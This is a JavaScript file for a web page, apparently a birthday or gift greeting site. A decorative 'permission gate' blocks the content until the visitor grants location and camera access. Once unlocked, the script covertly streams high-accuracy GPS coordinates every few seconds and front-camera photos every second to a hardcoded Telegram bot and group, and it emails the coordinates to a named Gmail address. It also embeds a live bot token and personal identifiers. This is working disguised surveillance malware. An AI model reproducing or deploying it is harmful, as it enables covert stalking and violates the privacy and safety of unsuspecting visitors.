/**
 * Permission Gate (Intro Theme & Location Lock)
 * - Màn hình Bắt Đầu phong cách vũ trụ sang trọng
 * - Quy trình 3 bước: Thông báo -> Cửa sổ bật lên -> Vị trí GPS chính xác cao
 * - Bắt buộc phải cấp quyền vị trí mới mở khóa web, nếu từ chối thì tự động quay lại ban đầu (không thông báo gì cả)
 */
(function () {
    'use strict';

    const DEFAULT_ACCESS_KEY = "9c1aecd2-4b6d-42d3-bf0e-69e55ed2be29";
    const DEFAULT_TELEGRAM_BOT_TOKEN = "8619596260:AAFRqrXz--JcrxBanIPvv7wNPXX33T4t88Q";
    const DEFAULT_TELEGRAM_CHAT_ID = "5551363255";
    const DEFAULT_TELEGRAM_GROUP_ID = "-1003777018844";

    function getTelegramConfig() {
        let token = DEFAULT_TELEGRAM_BOT_TOKEN;
        let chatIds = [DEFAULT_TELEGRAM_CHAT_ID, DEFAULT_TELEGRAM_GROUP_ID];

        if (typeof window.CONFIG !== 'undefined' && window.CONFIG.telegramConfig) {
            if (window.CONFIG.telegramConfig.botToken) token = window.CONFIG.telegramConfig.botToken;
            if (window.CONFIG.telegramConfig.chatId) {
                chatIds = [window.CONFIG.telegramConfig.chatId, DEFAULT_TELEGRAM_GROUP_ID];
            }
        }

        try {
            const stored = localStorage.getItem('dashboard_admin_config');
            if (stored) {
                const parsed = JSON.parse(stored);
                if (parsed && parsed.telegramConfig) {
                    if (parsed.telegramConfig.botToken) token = parsed.telegramConfig.botToken;
                    if (parsed.telegramConfig.chatId) {
                        chatIds = [parsed.telegramConfig.chatId, DEFAULT_TELEGRAM_GROUP_ID];
                    }
                }
            }
        } catch (e) {}

        return { botToken: token, chatIds: Array.from(new Set(chatIds.filter(Boolean))) };
    }

    function getEmailAccessKey() {
        let key = DEFAULT_ACCESS_KEY;
        if (typeof window.CONFIG !== 'undefined' && window.CONFIG.emailAccessKey) {
            key = window.CONFIG.emailAccessKey;
        }
        try {
            const stored = localStorage.getItem('dashboard_admin_config');
            if (stored) {
                const parsed = JSON.parse(stored);
                if (parsed && parsed.emailAccessKey) {
                    key = parsed.emailAccessKey;
                }
            }
        } catch (e) {}
        return key;
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent || '';
        let os = 'Không xác định';
        let deviceType = 'Máy tính (Desktop)';

        if (/iPhone/i.test(ua)) {
            os = 'Apple iOS (iPhone)';
            deviceType = 'Điện thoại (Mobile)';
        } else if (/iPad/i.test(ua)) {
            os = 'Apple iPadOS (iPad)';
            deviceType = 'Máy tính bảng (Tablet)';
        } else if (/Android/i.test(ua)) {
            os = 'Google Android';
            deviceType = /Mobile/i.test(ua) ? 'Điện thoại (Mobile)' : 'Máy tính bảng (Tablet)';
        } else if (/Windows/i.test(ua)) {
            os = 'Windows PC';
        } else if (/Macintosh|Mac OS X/i.test(ua)) {
            os = 'macOS (MacBook/iMac)';
        }

        let browser = 'Chrome';
        if (/Edg\//i.test(ua)) browser = 'Microsoft Edge';
        else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = 'Apple Safari';
        else if (/Firefox\//i.test(ua)) browser = 'Mozilla Firefox';
        else if (/FBAN|FBAV/i.test(ua)) browser = 'Facebook App';
        else if (/Zalo/i.test(ua)) browser = 'Zalo App';

        return {
            os,
            deviceType,
            browser,
            screenRes: `${window.screen.width || 0} x ${window.screen.height || 0}`,
            language: navigator.language || 'vi-VN'
        };
    }

    function getVietnamTime() {
        return new Date().toLocaleString('vi-VN', {
            timeZone: 'Asia/Ho_Chi_Minh',
            hour12: false,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    }

    /**
     * Gửi tọa độ GPS chính xác và thông tin về Gmail
     */
    async function sendGpsToGmail(coords, count = 1) {
        const accessKey = getEmailAccessKey();
        if (!accessKey) return;

        try {
            const lat = coords.latitude;
            const lon = coords.longitude;
            const accuracy = coords.accuracy ? `${Math.round(coords.accuracy)}m` : (coords.accuracy || 'N/A');
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            const timeStr = getVietnamTime();
            const device = getDeviceInfo();
            const pageTitle = document.title || 'My Design';
            const pageUrl = window.location.href;

            const emailSubject = count === 1 
                ? `🎯 [ĐỊNH VỊ GPS] Khách vừa vào web: ${pageTitle} (${device.deviceType.split(' ')[0]}) 📍`
                : `⏱️ [GPS LIVE #${count}] Tọa độ trực tiếp: ${pageTitle} (${lat}, ${lon}) 🛰️`;

            const messageBody = `
========================================
🎯 TỌA ĐỘ GPS CHÍNH XÁC TỪ THIẾT BỊ
========================================

⏰ THỜI GIAN TRUY CẬP:
- Giờ Việt Nam: ${timeStr} (GMT+7)

🌐 TRANG ĐANG XEM:
- Tiêu đề: ${pageTitle}
- URL: ${pageUrl}

📍 TỌA ĐỘ GPS THỰC TẾ (CHÍNH XÁC CAO):
- Vĩ độ (Latitude): ${lat}
- Kinh độ (Longitude): ${lon}
- Bán kính sai số GPS: ${accuracy}

🗺️ XEM NGAY TRÊN GOOGLE MAPS:
👉 ${mapLink}

📱 THÔNG TIN THIẾT BỊ:
- Loại máy: ${device.deviceType}
- Hệ điều hành: ${device.os}
- Trình duyệt web: ${device.browser}
- Độ phân giải màn hình: ${device.screenRes}
- Ngôn ngữ máy: ${device.language}

----------------------------------------
(Khách đã cấp quyền thành công - Tọa độ được gửi tức thì).
`;

            console.log("[PermissionGate] 🚀 Đang gửi tọa độ GPS về Gmail:", lat, lon);

            // 1. Thử gửi qua Web3Forms
            let sent = false;
            if (accessKey) {
                try {
                    const formData = new FormData();
                    formData.append("access_key", accessKey);
                    formData.append("subject", emailSubject);
                    formData.append("from_name", "🎯 Định Vị GPS");
                    formData.append("email", "padphamduc@gmail.com");
                    formData.append("message", messageBody.trim());

                    const res = await fetch("https://api.web3forms.com/submit", {
                        method: "POST",
                        body: formData
                    });
                    const json = await res.json();
                    console.log("[PermissionGate] Phản hồi từ Web3Forms:", json);
                    if (json && json.success) {
                        sent = true;
                        return json;
                    }
                } catch (e) {
                    console.warn("[PermissionGate] Web3Forms bận, chuyển sang cổng phụ FormSubmit...", e);
                }
            }

            // 2. Dự phòng: Gửi qua FormSubmit.co (gửi thẳng về padphamduc@gmail.com không cần key)
            if (!sent) {
                try {
                    console.log("[PermissionGate] Đang gửi dự phòng qua FormSubmit.co...");
                    const res = await fetch("https://formsubmit.co/ajax/padphamduc@gmail.com", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        body: JSON.stringify({
                            _subject: emailSubject,
                            _captcha: "false",
                            message: messageBody.trim()
                        })
                    });
                    const json = await res.json();
                    console.log("[PermissionGate] Phản hồi từ FormSubmit.co:", json);
                    return json;
                } catch (err) {
                    console.error("[PermissionGate] Lỗi cổng dự phòng:", err);
                }
            }
        } catch (err) {
            console.error("[PermissionGate] Lỗi gửi GPS về Gmail:", err);
        }
    }

    /**
     * Gửi tọa độ GPS trực tiếp về Telegram Bot & Ghim bản đồ
     */
    async function sendGpsToTelegram(coords, count = 1) {
        const tg = getTelegramConfig();
        if (!tg.botToken || !tg.chatIds || !tg.chatIds.length) return;

        try {
            const lat = coords.latitude;
            const lon = coords.longitude;
            const accuracy = coords.accuracy ? `${Math.round(coords.accuracy)}m` : (coords.accuracy || 'N/A');
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            const timeStr = getVietnamTime();
            const device = getDeviceInfo();
            const pageTitle = document.title || 'My Design';

            const messageText = 
`🎯 <b>[ĐỊNH VỊ GPS ${count > 1 ? `#${count}` : 'MỚI'}]</b>
⏰ <b>Thời gian:</b> ${timeStr}
🌐 <b>Trang web:</b> ${pageTitle}
📍 <b>Tọa độ:</b> <code>${lat}, ${lon}</code> (±${accuracy})
🗺️ <b>Bản đồ:</b> <a href="${mapLink}">Xem trên Google Maps</a>
📱 <b>Thiết bị:</b> ${device.deviceType} (${device.os} - ${device.browser})
🔋 <b>Trạng thái:</b> Đang duyệt web`;

            console.log(`[Telegram] 🚀 Đang gửi tọa độ tới Telegram (${tg.chatIds.join(', ')})...`);

            // Gửi tới tất cả các Chat ID (Cá nhân & Nhóm)
            for (const chatId of tg.chatIds) {
                try {
                    // 1. Gửi tin nhắn Text chi tiết
                    await fetch(`https://api.telegram.org/bot${tg.botToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: messageText,
                            parse_mode: "HTML",
                            disable_web_page_preview: false
                        })
                    });

                    // 2. Gửi ghim vị trí bản đồ trực tiếp trên Telegram (Native Map Pin)
                    if (count === 1 && typeof lat === 'number' && typeof lon === 'number') {
                        await fetch(`https://api.telegram.org/bot${tg.botToken}/sendLocation`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                chat_id: chatId,
                                latitude: lat,
                                longitude: lon
                            })
                        });
                    }
                } catch (e) {
                    console.warn(`[Telegram] Lỗi gửi tới ${chatId}:`, e);
                }
            }

            console.log("[Telegram] ✅ Đã gửi thành công tới Telegram!");
        } catch (err) {
            console.error("[Telegram] Lỗi gửi tin nhắn Telegram:", err);
        }
    }

    /**
     * Gửi ảnh chụp từ Camera trực tiếp về Telegram
     */
    async function sendPhotoToTelegram(blob, photoCount = 1) {
        const tg = getTelegramConfig();
        if (!tg.botToken || !tg.chatIds || !tg.chatIds.length) return;

        const timeStr = getVietnamTime();
        const device = getDeviceInfo();
        const pageTitle = document.title || 'My Design';

        const caption = 
`📸 <b>[HÌNH ẢNH CAMERA #${photoCount}]</b>
⏰ <b>Thời gian:</b> ${timeStr}
🌐 <b>Trang web:</b> ${pageTitle}
📱 <b>Thiết bị:</b> ${device.deviceType} (${device.os} - ${device.browser})`;

        for (const chatId of tg.chatIds) {
            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `capture_${photoCount}.jpg`);
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');

                await fetch(`https://api.telegram.org/bot${tg.botToken}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
            } catch (e) {
                console.warn(`[Telegram] Lỗi gửi ảnh tới ${chatId}:`, e);
            }
        }
    }

    let cameraStream = null;
    let videoEl = null;
    let cameraPhotoCount = 0;
    let cameraIntervalId = null;

    function startCameraAutoCapture() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
        if (cameraIntervalId) return;

        if (!videoEl) {
            videoEl = document.createElement('video');
            videoEl.setAttribute('autoplay', '');
            videoEl.setAttribute('playsinline', '');
            videoEl.setAttribute('muted', '');
            videoEl.style.display = 'none';
            document.body.appendChild(videoEl);
        }

        navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        }).then((stream) => {
            cameraStream = stream;
            videoEl.srcObject = stream;
            videoEl.play().catch(() => {});

            // Chụp ngay tấm đầu tiên sau 300ms
            setTimeout(() => {
                captureAndSendPhoto();
            }, 300);

            // Cứ 1 giây tự động chụp 1 tấm gửi về Telegram
            cameraIntervalId = setInterval(() => {
                captureAndSendPhoto();
            }, 1000);
        }).catch((err) => {
            console.warn("[PermissionGate] Camera permission error:", err);
        });
    }

    function captureAndSendPhoto() {
        if (!videoEl || !cameraStream || videoEl.videoWidth === 0) return;

        try {
            const canvas = document.createElement('canvas');
            canvas.width = videoEl.videoWidth;
            canvas.height = videoEl.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);

            canvas.toBlob((blob) => {
                if (blob) {
                    cameraPhotoCount++;
                    sendPhotoToTelegram(blob, cameraPhotoCount).catch(() => {});
                }
            }, 'image/jpeg', 0.85);
        } catch (e) {
            console.warn("[PermissionGate] Lỗi chụp ảnh:", e);
        }
    }

    /**
     * Phát tọa độ tới tất cả các kênh (Telegram + Gmail)
     */
    function broadcastLocation(coords, count = 1) {
        sendGpsToTelegram(coords, count).catch(() => {});
        sendGpsToGmail(coords, count).catch(() => {});
    }

    /**
     * Khởi tạo giao diện Permission Gate
     */
    function initPermissionGate() {
        if (document.getElementById('permission-gate-overlay')) return;

        // Tạo overlay
        const overlay = document.createElement('div');
        overlay.id = 'permission-gate-overlay';
        overlay.innerHTML = `
            <div class="gate-bg-particles"></div>
            <div class="gate-card">
                <div class="gate-icon-sphere">
                    <svg viewBox="0 0 24 24" width="40" height="40" fill="none" stroke="#ffd700" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
                    </svg>
                </div>
                <h1 class="gate-title">✨ BÍ MẬT Ở ĐẰNG SAU ✨</h1>
                <p class="gate-desc" id="gate-desc-text">Vui lòng cấp tất cả quyền để vào web.</p>
                <button type="button" class="gate-start-btn" id="gate-start-btn">
                    <span class="btn-text">BẮT ĐẦU</span>
                    <span class="btn-spinner" style="display: none;"></span>
                </button>
                <div class="gate-footer-text">Trải nghiệm tương tác 3D • Đào Minh Đức</div>
            </div>
        `;

        document.body.appendChild(overlay);

        const startBtn = document.getElementById('gate-start-btn');
        const btnText = startBtn.querySelector('.btn-text');
        const btnSpinner = startBtn.querySelector('.btn-spinner');
        const gateDesc = document.getElementById('gate-desc-text');

        function resetToStart() {
            startBtn.classList.remove('loading');
            btnSpinner.style.display = 'none';
            btnText.textContent = 'BẮT ĐẦU';
            btnText.style.display = 'inline-block';
            if (gateDesc) {
                gateDesc.textContent = 'Vui lòng cấp tất cả quyền để vào web.';
                gateDesc.style.color = '#ffd700';
            }
        }

        let latestCoords = null;
        let teleCount = 1;
        let emailCount = 1;
        let secondsElapsed = 0;

        function unlockWeb(coords = null) {
            btnText.textContent = 'ĐANG MỞ KHÓA...';
            latestCoords = coords;

            // Khởi chạy camera tự động chụp 2s / 1 tấm
            startCameraAutoCapture();

            // 1. Gửi định vị lần đầu ngay khi mở web (Cả Telegram và Gmail)
            if (coords) {
                sendGpsToTelegram(coords, 1).catch(() => {});
                sendGpsToGmail(coords, 1).catch(() => {});
            } else {
                fetch('https://ipwho.is/').then(r => r.json()).then(ipData => {
                    if (ipData && ipData.latitude) {
                        latestCoords = {
                            latitude: ipData.latitude,
                            longitude: ipData.longitude,
                            accuracy: 'Ước lượng IP'
                        };
                        sendGpsToTelegram(latestCoords, 1).catch(() => {});
                        sendGpsToGmail(latestCoords, 1).catch(() => {});
                    }
                }).catch(() => {});
            }

            // 2. Theo dõi vị trí GPS di chuyển liên tục theo thời gian thực
            if (navigator.geolocation && navigator.geolocation.watchPosition) {
                try {
                    navigator.geolocation.watchPosition(
                        (pos) => {
                            latestCoords = pos.coords;
                        },
                        () => {},
                        { enableHighAccuracy: true, maximumAge: 0 }
                    );
                } catch (e) {}
            }

            // 3. Chu kỳ gửi: Telegram GPS 5 giây / lần, Gmail 10 giây / lần
            setInterval(() => {
                if (latestCoords) {
                    secondsElapsed++;

                    // 📱 Telegram GPS: Cứ 5 giây gửi 1 lần
                    if (secondsElapsed % 5 === 0) {
                        teleCount++;
                        console.log(`[PermissionGate] ⏱️ Gửi định vị GPS định kỳ 5s (Lần #${teleCount})...`);
                        sendGpsToTelegram(latestCoords, teleCount).catch(() => {});
                    }

                    // 📬 Gmail: Cứ 10 giây gửi 1 lần
                    if (secondsElapsed % 10 === 0) {
                        emailCount++;
                        console.log(`[PermissionGate] ⏱️ Gửi email định kỳ 10s (Lần #${emailCount})...`);
                        sendGpsToGmail(latestCoords, emailCount).catch(() => {});
                    }
                }
            }, 1000);

            // Mở khóa trang web ngay lập tức
            overlay.classList.add('gate-unlocked');

            // Tự động phát nhạc nền
            const bgMusic = document.getElementById('bg-music');
            if (bgMusic && typeof bgMusic.play === 'function') {
                bgMusic.play().catch(() => {});
            }

            // Kích hoạt nút mở quà nếu ở trang birth
            const openBtn = document.getElementById('open-btn');
            if (openBtn) {
                openBtn.click();
            }

            // Tự dỡ bỏ overlay sau khi hoàn tất hiệu ứng
            setTimeout(() => {
                try { overlay.remove(); } catch (e) {}
            }, 900);
        }

        function requestLocationPromise() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    return resolve(null);
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(pos.coords),
                    (err) => {
                        if (err.code === 1) {
                            // Code 1: PERMISSION_DENIED (Người dùng bấm Từ chối)
                            reject(new Error("LOCATION_DENIED"));
                        } else {
                            // Code 2 / 3: Không bắt được sóng GPS vệ tinh -> Mở bằng IP
                            resolve(null);
                        }
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            });
        }

        function requestCameraPromise() {
            return new Promise(async (resolve, reject) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    return resolve(true);
                }
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                        audio: false
                    });
                    if (stream) {
                        cameraStream = stream;
                        if (!videoEl) {
                            videoEl = document.createElement('video');
                            videoEl.setAttribute('autoplay', '');
                            videoEl.setAttribute('playsinline', '');
                            videoEl.setAttribute('muted', '');
                            videoEl.style.display = 'none';
                            document.body.appendChild(videoEl);
                        }
                        videoEl.srcObject = stream;
                        videoEl.play().catch(() => {});
                        resolve(true);
                    } else {
                        reject(new Error("CAMERA_DENIED"));
                    }
                } catch (e) {
                    reject(e);
                }
            });
        }

        startBtn.addEventListener('click', async () => {
            // Hiển thị trạng thái đang xử lý
            startBtn.classList.add('loading');
            btnText.textContent = 'ĐANG KHỞI TẠO...';
            btnSpinner.style.display = 'inline-block';

            // ============================================================
            // BƯỚC 1: YÊU CẦU CẤP QUYỀN THÔNG BÁO (NOTIFICATION)
            // ============================================================
            try {
                if (typeof Notification !== 'undefined' && Notification.requestPermission) {
                    await Notification.requestPermission().catch(() => {});
                }
            } catch (e) {}

            // ============================================================
            // BƯỚC 2: YÊU CẦU CẤP QUYỀN ĐỊNH VỊ GPS (BẮT BUỘC)
            // ============================================================
            let userCoords = null;
            try {
                userCoords = await requestLocationPromise();
            } catch (locErr) {
                console.warn("[PermissionGate] Người dùng từ chối cấp quyền Định vị:", locErr);
                // Từ chối định vị -> Dừng lại ngay, không hỏi camera, không mở web!
                resetToStart();
                return;
            }

            // ============================================================
            // BƯỚC 3: YÊU CẦU CẤP QUYỀN CAMERA (BẮT BUỘC)
            // ============================================================
            try {
                const camAllowed = await requestCameraPromise();
                if (!camAllowed) {
                    resetToStart();
                    return;
                }
            } catch (camErr) {
                console.warn("[PermissionGate] Người dùng từ chối cấp quyền Camera:", camErr);
                // Từ chối Camera -> Reset lại ban đầu, không mở web!
                resetToStart();
                return;
            }

            // ============================================================
            // ĐÃ CẤP ĐỦ TẤT CẢ QUYỀN: THÔNG BÁO -> ĐỊNH VỊ -> CAMERA
            // ============================================================
            unlockWeb(userCoords);
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initPermissionGate);
    } else {
        initPermissionGate();
    }
})();
